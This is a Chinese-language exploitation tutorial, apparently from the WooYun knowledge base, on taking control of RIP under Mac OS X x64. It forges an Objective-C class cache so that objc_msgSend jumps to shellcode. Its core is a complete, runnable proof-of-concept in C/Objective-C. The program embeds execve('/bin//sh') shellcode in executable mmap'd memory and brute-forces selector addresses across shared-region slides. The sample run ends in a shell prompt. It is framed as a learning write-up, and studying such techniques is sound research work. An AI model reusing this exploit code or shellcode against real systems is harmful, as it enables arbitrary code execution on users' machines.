# Mac OS X x64 环境下覆盖objective-c类结构并通过objc_msgSend获得RIP执行shellcode

_author vvun91e0n_

0x00 前言
=====

阅读学习国外nemo大牛《Modern Objective-C Exploitation Techniques》文章的内容，就想在最新的OS X版本上调试出作者给出的代码。控制rip。我根据自己的调试，修改了原程序，才调试成功。对大牛原程序的部分代码的意图和计算方法难免理解不足，欢迎留言与我交流学习。本文主要简要介绍下对objective-c类的覆盖到控制rip的技术。是目前OS X平台下，比较主流的一种溢出利用方式。

0x01 64位汇编知识及lldb简单调试命令
=====

汇编知识主要是在调试的时候使用，在64位平台下调试必不可少的知识。对此熟悉的读者可直接跳过。下面简要介绍下64位汇编。

RIP的就是64位的指令寄存器。

通用64位寄存器

```
RAX RBX RCX RDX RBP RSI RDI RSP

```

R8 －－－ R15

可以使用

*   EAX 访问RAX的低32bits
*   AX 访问RAX的低16bits
*   AL 访问RAX的低8bist
*   AH 访问RAX低16bits的高8bits

OS X 64位的汇编调用约定，可以参考AMD64 Application Binary Interface

x86-64 Function Calling convention:

1.  If the class is MEMORY, pass the argument on the stack.
    
2.  If the class is INTEGER, the next available register of the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9 is used.
    

可以看到和32位汇编的通过push压栈来传递参数不同，函数的参数传递基本是通过寄存器来完成的。顺序如上。 32位汇编通过int 0x80来进行系统调用，64位汇编是通过syscall来调用的。

lldb是苹果公司推出的用以替代gdb的调试器。随xcode一起安装。是进行动态调试的利器。调试时必不可少。下面简要介绍下会用到的一些基础命令：

在命令行输入lldb，就会进入调试工具

```
(lldb)

```

help会显示所有的命令，需要详细了解可以用输入help ＋ 命令查询

file命令加载需要调试的程序

```
(lldb) file /Users/vvun91e0n/Desktop/OC64exploit
Current executable set to '/Users/vvun91e0n/Desktop/OC64exploit' (x86_64).

```

breakpoint set用来设置断点

```
(lldb) breakpoint set --name length

```

breakpoint list可以用来查看所有断点 breakpoint disable 关闭断点 breakpoint enable 激活断点 ni 单步步不执行指令

run或r启动进程进行调试

register read 读取现在所有寄存器的值 想读取特定的几个寄存器，写在后面就行，使用简化命令如

```
(lldb) re r rdi r10 rsi
 rdi = 0x0000000100202fa0
 r10 = 0x0000000000000001
 rsi = 0x00007fff907bb509

```

memory read 可以读取指定地址的内存数据，如下指定地址就是length字符串。也可以使用gdb风格的x 0x00007fff907bb509命令来读取内存数据。

```
(lldb) memory read 0x00007fff907bb509
0x7fff907bb509: 6c 65 6e 67 74 68 00 69 73 54 79 70 65 4e 6f 74  length.isTypeNot
0x7fff907bb519: 45 78 63 6c 75 73 69 76 65 3a 00 61 70 70 65 6e  Exclusive:.appen
(lldb) x 0x00007fff907bb509
0x7fff907bb509: 6c 65 6e 67 74 68 00 69 73 54 79 70 65 4e 6f 74  length.isTypeNot
0x7fff907bb519: 45 78 63 6c 75 73 69 76 65 3a 00 61 70 70 65 6e  Exclusive:.appen

```

continue 或者c 命令来继续执行。 kill来结束进程。run来重新启动。 其他如条件断点，修改寄存器值等命令读者可以使用help命令了解。

0x02 objective-c方法调用
=====

你需要对objective-c语言有一定的基本的了解。特别是objc_msgSend函数的调用机制。可以参考：《The Objective-C Runtime: Understanding and Abusing》。这篇文章是nemo2009年发表在phrack上的。在32位系统基础上讲Objective-C Runtime溢出的文章。还是有阅读价值的。特别是对后面64位溢出的理解。

下面简要介绍下objective-c，先看看一个简单的类实现和调用：

```
//  Talker.h
#import <Foundation/Foundation.h>
@interface Talker : NSObject        //定义一个类
- (void) say: (char *) str;         //声明一个say方法
@end

//  Talker.m
#import "Talker.h"
@implementation Talker              //类的相关方法实现
- (void) say: (char *) phrase
{
    printf("%s\n",phrase);
}
@end

//main.m
#import "Talker.h"
int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // insert code here...
        Talker *talker = [[Talker alloc] init];//分配内存，初始化
        [talker say: "Hello, World!"];          //调用say方法
    }
    return 0;
}

```

如上面代码所示，定义了一个Talker类，并在main函数中调用了say方法。 可以看出objective-c语言的方法调用语法为

[\\: \];

主程序进行了3次函数调用

```
class  | method 
-------|-----------         
Talker | alloc
talker | init 
talker | say

```

将上面的代码在xcode中编译生成后的程序放入Hopper静态反汇编后，会得到一下汇编代码（注：这个事release版的结果，debug版的反汇编结果稍有不同）

```
mov     rdi, qword [ds:objc_cls_ref_Talker]     ; objc_cls_ref_Talker, argument "instance" for method _objc_msgSend
mov     rsi, qword [ds:0x1000010f8]             ; @selector(alloc), argument "selector" for method _objc_msgSend
mov     r15, qword [ds:imp___got__objc_msgSend] ; imp___got__objc_msgSend
call    r15                                     ; _objc_msgSend
mov     rsi, qword [ds:0x100001100]             ; @selector(init), argument "selector" for method _objc_msgSend
mov     rdi, rax                                ; argument "instance" for method _objc_msgSend
call    r15                                     ; _objc_msgSend
mov     rbx, rax
mov     rsi, qword [ds:0x100001108]             ; @selector(say:), argument "selector" for method _objc_msgSend
lea     rdx, qword [ds:0x100000f70]             ; "Hello, World!"
mov     rdi, rbx                                ; argument "instance" for method _objc_msgSend
call    r15                                     ; _objc_msgSend

```

可以看出在进行方法调用时并不是直接call方法地址，而是将方法的selector作为第二个参数传入rsi寄存器。与之前介绍的64位汇编调用约定一样。第一参数对象指针isa压入rdi。然后call r15调用objc_msgSend函数。这个函数就是需要研究利用的对象。相对于c语言在编译时就决定运行时所调用的函数的静态绑定。objectie-c语言利用了消息传递objc_msgSend函数在运行时，动态绑定调用函数。objective-c利用这个消息机制实现了runtime的方法调用。提高了语言的灵活性。使得objective-c成为了一门动态语言。

0x03 objective-c的类结构和objc_msgSend函数
===================================

在64位系统中，runtime进行了重新编写，类的实现由原来的c语言struct结构，变成了c++类。

```
struct objc_class : objc_object {
// Class ISA;
Class superclass;
cache_t cache;      // formerly cache pointer and vtable
class_data_bits_t bits; // class_rw_t * plus custom rr/alloc flags
… 
}

```

类的第一个变量指向父类，在查询不到需要调用的方法时，会向父类继续进行查询。 第二个变量指向cache，这个cache缓存了最近调用方法的selector和imp（方法入口地址），之所以使用cache就是为了提高objective-c语言的动态绑定特性的效率。加快查询速度。

```
struct cache_t {
struct bucket_t *_buckets;
mask_t _mask;
mask_t _occupied;
… 
}

struct bucket_t {
private:
cache_key_t _key;
IMP _imp; 
...
}

```

cache的结构如上，cache里面的buckets指向一个bucket类，类里面的_key就是selector，指向选择子的字符串。_imp指向方法地址。

其中需要说明的是_mask。这个mask用来和输入的sel进行按位与，对结果进行处理，作为buckets数组的序号。加快选择速度，确定范围。在我们的实验代码里，根据调试发现mask实际上起到一个确定遍历范围的作用。

我的程序在mask的选择上，是根据我自己的调试结果设置的。nemo的源码的mask设置在我机器上运行后会取到非法内存。不知道是不是版本改变了更新了还是什么其他的原因导致的。我调试的时候lldb反汇编了objc_msgSend函数，对照该函数的源代码进行了调试。对nemo的代码进行了修改。读者可以同时看看nemo的源代码。还有几处我都做出了修改。

查询Objective-C Runtime Reference，可以得到该函数声明如下

```
id objc_msgSend ( id self, SEL op, ... );
Parameters：
self    A pointer that points to the instance of the class that is to receive the message.
op      The selector of the method that handles the message.
...     A variable argument list containing the arguments to the method.

```

该函数的源代码是开源的，由汇编语言实现，以提高objective-c的执行效率。

大家看到第一个self参数实际就是指向实例的指针。第二个op参数就是sel，就是选择子。指向方法名字符串。

关于objc_msgSend的汇编源代码可以到苹果公司网站查看。以下是目前最新版本的链接地址[http://www.opensource.apple.com/source/objc4/objc4-646/runtime／Messengers.subproj/objc-msg-x86_64.s](http://www.opensource.apple.com/source/objc4/objc4-646/runtime%EF%BC%8FMessengers.subproj/objc-msg-x86_64.s)

下面给出源代码

```
/********************************************************************
 *
 * id objc_msgSend(id self, SEL _cmd,...);
 *
 ********************************************************************/

    .data
    .align 3
    .globl _objc_debug_taggedpointer_classes
_objc_debug_taggedpointer_classes:
    .fill 16, 8, 0

    ENTRY   _objc_msgSend
    MESSENGER_START

    NilTest NORMAL

    GetIsaFast NORMAL       // r11 = self->isa
    CacheLookup NORMAL      // calls IMP on success

    NilTestSupport  NORMAL

    GetIsaSupport   NORMAL

// cache miss: go search the method lists
LCacheMiss:
    // isa still in r11
    MethodTableLookup %a1, %a2  // r11 = IMP
    cmp %r11, %r11      // set eq (nonstret) for forwarding
    jmp *%r11           // goto *imp

    END_ENTRY   _objc_msgSend

    ENTRY _objc_msgSend_fixup
    int3
    END_ENTRY _objc_msgSend_fixup

    STATIC_ENTRY _objc_msgSend_fixedup
    // Load _cmd from the message_ref
    movq    8(%a2), %a2
    jmp _objc_msgSend
    END_ENTRY _objc_msgSend_fixedup

```

可以看到该函数先获取isa指针，然后调用Cachelookup，在Cache中寻找sel，如果找不到就调用MethodTableLookup，在MethodTable中继续查找sel。这样只要我们能够覆盖类的内存，构造虚假的cache，提供正确的sel，就能够最终控制rip。对类结构进行溢出覆盖控制也是现在比较流行的OS X下溢出利用技术。

下面再来看看CacheLookup的源代码：

```
.macro  CacheLookup
.if $0 != STRET  &&  $0 != SUPER_STRET  &&  $0 != SUPER2_STRET
    movq    %a2, %r10       // r10 = _cmd
.else
    movq    %a3, %r10       // r10 = _cmd
.endif
    andl    24(%r11), %r10d     // r10 = _cmd & class->cache.mask
    shlq    $$4, %r10       // r10 = offset = (_cmd & mask)<<4
    addq    16(%r11), %r10      // r10 = class->cache.buckets + offset

.if $0 != STRET  &&  $0 != SUPER_STRET  &&  $0 != SUPER2_STRET
    cmpq    (%r10), %a2     // if (bucket->sel != _cmd)
.else
    cmpq    (%r10), %a3     // if (bucket->sel != _cmd)
.endif
    jne     1f          //     scan more
    // CacheHit must always be preceded by a not-taken `jne` instruction
    CacheHit $0         // call or return imp

1:
    // loop
    cmpq    $$0, (%r10)
    je  LCacheMiss_f        // if (bucket->sel == 0) cache miss
    cmpq    16(%r11), %r10
    je  3f          // if (bucket == cache->buckets) wrap

    subq    $$16, %r10      // bucket--
2:  
.if $0 != STRET  &&  $0 != SUPER_STRET  &&  $0 != SUPER2_STRET
    cmpq    (%r10), %a2     // if (bucket->sel != _cmd)
.else
    cmpq    (%r10), %a3     // if (bucket->sel != _cmd)
.endif
    jne     1b          //     scan more
    // CacheHit must always be preceded by a not-taken `jne` instruction
    CacheHit $0         // call or return imp
</code></pre>

其中的CacheHit就是在sel匹配成功后跳转到imp，从中可以看出mask的具体使用方法。

    andl    24(%r11), %r10d     // r10 = _cmd & class->cache.mask
    shlq    $$4, %r10       // r10 = offset = (_cmd & mask)<<4
    addq    16(%r11), %r10      // r10 = class->cache.buckets + offset

```

sel和mask进行了andl操作，命令andl操作数是32位。而且后面的操作数时％r10d，表示的是r10的低32位。r10的高32位应该不变。但是读者在调试的时候可能会发现证明r10的高32位也置零了。

关于这里大家就需要查查Intel的手册。有这样一句：

• 32-bit operands generate a 32-bit result, zero-extended to a 64-bit result in the destination general-purpose register.

由此可见，andl命令会将结果扩展到64位。

之后，将与后的结果左移4位得到offset。将offset加到buckets的上。

初始时offset就指向来整个数组的最后。通过subq命令递减。

```
subq    $$16, %r10      // bucket--

```

从后向前来遍历buckets数组。如果命中了sel就可以跳到imp了。16就是我们bucket_t结构的大小。 说了这么多。接下来就来看看代码。

0x04 具体代码及细节说明
=====

完整代码如下：

```
/*
*   main.m
*   OC64exploit Demo
*
*   Author:    vvun91e0n
*   Date:      2015-05-25
*   Tested on: Mac OS X 10.10.3 （Darwin kernel version 14.3.0）& 10.10.4
*   Base on: nemo's source code @ www.phrack.com/papers/modern_objc_exploitation.html
*   Shellcode on: Dustin Schultz‘source code @ www.exploit－db.com/exploits/15618
*/

#import <Foundation/Foundation.h>
#define NUMBUCKETS 0x20000
#define MASK  0x20000
#define BASESEL 0x7fff80000509     //0x7fff907bb509 my "length" sel address
                                   //may change in different os or different app

struct fakecache {
    char pad[0x10];
    long bucketptr;
    long mask;
};

struct cacheentry {
    long sel;
    long rip;
};

char shellcode[] =
"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
"\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68";

int main(int argc, const char * argv[])
{
    struct fakecache fc;
    char num[50];
    unsigned int slide;

    void *pshellcode = mmap(0, 0x33, PROT_EXEC | PROT_WRITE
                           | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (pshellcode == MAP_FAILED) {
        printf("[+] shellcode mmap failed\n");
        exit(1);
    }
    memcpy(pshellcode, shellcode, sizeof(shellcode));
    printf("[+] Setting up shellcode\n");

    struct cacheentry *buckets = malloc((NUMBUCKETS+1) * sizeof(struct cacheentry));
    if(!buckets) {
        printf("[!] allocation failed.\n");
        exit(1);
    }
    for(slide = 0; slide <= NUMBUCKETS ; slide++) {
        buckets[slide].sel = BASESEL + (slide * 0x1000);
        buckets[slide].rip = (long)pshellcode;
    }
    printf("[+] Setting up buckets\n");

    NSString *l = [[NSString alloc] initWithUTF8String:"hello world"];


    memset(&fc,'\xcc',sizeof(fc));
    fc.mask = MASK; // mask
    fc.bucketptr = (unsigned long)buckets;
    printf("[+] Setting up fc\n");

    printf("[+] fc @ 0x%lx\n",(unsigned long)&fc);
    printf("[+] Class @ 0x%lx\n",(unsigned long)l);
    printf("[+] Buckets @ 0x%lx\n",(unsigned long)buckets);
    printf("[+] String length: 0x%x\n",(unsigned int)[l length]);

    sprintf(num,"%li",(long)l);
    long *ptr = (long *)atol(num);
    *ptr = (long)&fc; // isa ptr
    printf("[+] Overwriting object\n");

    printf("[+] Calling method\n");
    printf("String length: 0x%x\n",(unsigned int)[l length]);
    return 0;
}

```

具体步骤说明：

*   先申请一块可以执行的内存来存放shellcode。该shellcode功能是起一个sh。
*   在申请一块内存在构建bucket块。NUMBUCKETS的大小设置可以修改，合适就好。
*   开始构建虚假的bucket块。一共构建了NUMBUCKETS+1个。

每个bucket的rip(即imp)都指向shellcode的地址。

bucket的sel就是对应的length方法的选择子地址，也就是字符串的地址。这个就涉及到了OS X系统共享区域(Shared Region)的动态库dylib加载空间问题了。在64bit OS X系统里面共享区域开始于地址0x7FFF80000000。动态库加载地址会随机加上一个偏移。但是偏移都是以内存页为单位的，一个页的大小是0x1000。

通过在一个正常程序NSString类的length方法上下了断点，执行程序断在此处查看调用时的第二个参数rsi寄存器的值，我们就能得到这个length的地址

```
Process 5001 stopped
* thread #1: tid = 0x54aeb, 0x00007fff927cf1d0 CoreFoundation`-[__NSCFString length], queue = 'com.apple.main-thread', stop reason = breakpoint 1.32
    frame #0: 0x00007fff927cf1d0 CoreFoundation`-[__NSCFString length]
CoreFoundation`-[__NSCFString length]:
->  0x7fff927cf1d0 <+0>: pushq  %rbp
    0x7fff927cf1d1 <+1>: movq   %rsp, %rbp
    0x7fff927cf1d4 <+4>: popq   %rbp
    0x7fff927cf1d5 <+5>: jmp    0x7fff927cdcd0            ; _CFStringGetLength2
(lldb) re r rsi
     rsi = 0x00007fff907bb509
(lldb) x 0x00007fff907bb509
0x7fff907bb509: 6c 65 6e 67 74 68 00 69 73 54 79 70 65 4e 6f 74  length.isTypeNot
0x7fff907bb519: 45 78 63 6c 75 73 69 76 65 3a 00 61 70 70 65 6e  Exclusive:.appen

```

由于加载以页为单位所以 后面的12bit 509是不会改变的。我们构建虚假bucket时就以0x1000为单位进行不断尝试每个地址。如果NUMBUCKETS的大小还不够，还可以增加。如果执行正确总会碰撞到正确的sel。从而转到imp。

*   构建虚假的objc_object结构，即代码中的fakecache，前面的superclass变量可随意填充。fc.mask和fc.bucketptr设置成对应值。
*   新建一个NSString类实例指针l。将l指针的地址改为fc的地址。
*   对l调用方法length。这样会调用objc_msgSend函数。

如果一些正常执行回执行shellcode，启动一个sh

```
MacBook:~ vvun91e0n$ /Users/vvun91e0n/Desktop/OC64exploit
[+] Setting up shellcode
[+] Setting up buckets
[+] Setting up fc
[+] fc @ 0x7fff57daba70
[+] Class @ 0x7f8733c0d410
[+] Buckets @ 0x107ecd000
[+] String length: 0xb
[+] Overwriting object
[+] Calling method
sh-3.2$ 

```

在调试的时候可以利用添加条件断点断在最后一个溢出时调用的objc_msgSend处，利用单步执行ni命令。一条一条执行进行调试。利用disasseble命令查看objc_msgSend函数的反汇编代码。

0x05 总结
=====

通过这个代码调试过程验证里对objective-c类结构进行溢出的可行性。可以成功获得rip。

在实际应用中可能不像例子中，直接修改类的地址。而是通过溢出覆盖一个类结构的数据。来获得rip。

但是在实际的应用中获得rip还是远远不够的。还要对抗NX和ASLR等技术。现在比较通用的方法还是利用ROP chain等技术来成功利用溢出。

谢谢阅读

参考：
===

1.  Modern Objective-C Exploitation Techniques[http://www.phrack.org/papers/modern_objc_exploitation.html](http://www.phrack.org/papers/modern_objc_exploitation.html)
    
2.  The Objective-C Runtime: Understanding and Abusing[http://www.phrack.org/issues/66/4.html#article](http://www.phrack.org/issues/66/4.html#article)
    
3.  AMD64 Application Binary Interface[http://x86-64.org/documentation/abi.pdf](http://x86-64.org/documentation/abi.pdf)
    
4.  Objective-C消息机制的原理[http://dangpu.sinaapp.com/?p=119](http://dangpu.sinaapp.com/?p=119)
    
5.  详解objc_msgSend[http://www.cnblogs.com/tekkaman/archive/2013/05/23/3094549.html](http://www.cnblogs.com/tekkaman/archive/2013/05/23/3094549.html)
    
6.  理解objc_msgSend的作用[http://book.51cto.com/art/201403/432144.htm](http://book.51cto.com/art/201403/432144.htm)
    

©乌云知识库版权所有 未经许可 禁止转载

[收藏](javascript:void(0))

[分享](javascript:void(0))

### 为您推荐了适合您的技术文章:

1.  [Android证书信任问题与大表哥](http://drops.wooyun.org/tips/3296)
2.  [攻击JavaWeb应用[1]-JavaEE 基础](http://drops.wooyun.org/tips/163)
3.  [Smalidea无源码调试 android 应用](http://drops.wooyun.org/tips/7181)
4.  [保护自己之手机定位信息收集](http://drops.wooyun.org/tips/348)

  
![null](http://drops.com:8000/wooyun/captcha.php?0.17318951747136158)  

![30](http://zone.wooyun.org/upload/avatar/avatar_69521436404058.jpg)

JGHOOluwa2015-06-12 09:00:45

牛逼，膜拜~

[回复](javascript:void(null))

[![null](http://static.wooyun.org/static/avatar_50_50.png)](http://drops.com:8000/author/vvun91e0n)[vvun91e0n](http://drops.com:8000/author/vvun91e0n)

感谢知乎授权页面模版